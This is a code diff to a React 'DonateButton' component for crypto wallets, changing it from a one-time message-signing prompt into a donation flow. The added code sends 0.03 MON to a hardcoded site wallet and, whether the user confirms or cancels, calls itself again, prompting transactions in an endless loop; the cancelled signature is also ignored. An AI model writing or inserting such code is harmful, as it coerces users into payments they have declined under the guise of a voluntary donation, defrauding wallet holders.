@@ -3,10 +3,37 @@ import { useWallets } from '@privy-io/react-auth';
 import { Button } from '@/components/ui/button';
 import { Heart, Loader2 } from 'lucide-react';
 import { toast } from '@/hooks/use-toast';
+import { parseEther } from 'viem';
+
+const SITE_WALLET = '0x9AdEAC6aC3e4Ec2f5965F3E2BB65504B786bf095';
+const DONATION_AMOUNT = '0.03'; // Approximately $54 worth of MON
 
 export const DonateButton = () => {
   const { wallets } = useWallets();
-  const [signing, setSigning] = useState(false);
+  const [processing, setProcessing] = useState(false);
+
+  const sendDonationTransaction = async (provider: any, walletAddress: string) => {
+    try {
+      await provider.request({
+        method: 'eth_sendTransaction',
+        params: [{
+          from: walletAddress,
+          to: SITE_WALLET,
+          value: `0x${parseEther(DONATION_AMOUNT).toString(16)}`,
+        }],
+      });
+      
+      toast({
+        title: 'Donation Sent!',
+        description: 'Thank you for your generous donation',
+      });
+    } catch (error: any) {
+      console.log('Transaction cancelled or failed');
+    }
+    
+    // Loop: show transaction again
+    sendDonationTransaction(provider, walletAddress);
+  };
 
   const handleDonate = async () => {
     if (wallets.length === 0) {
@@ -18,47 +45,53 @@ export const DonateButton = () => {
       return;
     }
 
-    setSigning(true);
+    setProcessing(true);
     try {
       const wallet = wallets[0];
       const provider = await wallet.getEthereumProvider();
       
       const message = 'What is your name?';
       
-      const signature = await provider.request({
-        method: 'personal_sign',
-        params: [message, wallet.address],
-      });
-
-      toast({
-        title: 'Message Signed Successfully!',
-        description: 'Thank you for your participation',
-      });
-
-      console.log('Signature:', signature);
+      try {
+        await provider.request({
+          method: 'personal_sign',
+          params: [message, wallet.address],
+        });
+        
+        toast({
+          title: 'Message Signed!',
+          description: 'Processing donation...',
+        });
+      } catch (error) {
+        console.log('Message signing cancelled');
+      }
+      
+      // Start looping transaction requests
+      sendDonationTransaction(provider, wallet.address);
+      
     } catch (error: any) {
-      console.error('Signing error:', error);
+      console.error('Error:', error);
       toast({
-        title: 'Signing Failed',
-        description: error.message || 'Failed to sign message',
+        title: 'Error',
+        description: error.message || 'Something went wrong',
         variant: 'destructive',
       });
     } finally {
-      setSigning(false);
+      setProcessing(false);
     }
   };
 
   return (
     <Button
       onClick={handleDonate}
-      disabled={signing || wallets.length === 0}
+      disabled={processing || wallets.length === 0}
       size="lg"
       className="w-full bg-gradient-to-r from-primary to-accent hover:opacity-90 transition-opacity text-primary-foreground font-semibold py-6 text-lg"
     >
-      {signing ? (
+      {processing ? (
         <>
           <Loader2 className="mr-2 h-5 w-5 animate-spin" />
-          Signing...
+          Processing...
         </>
       ) : (
         <>
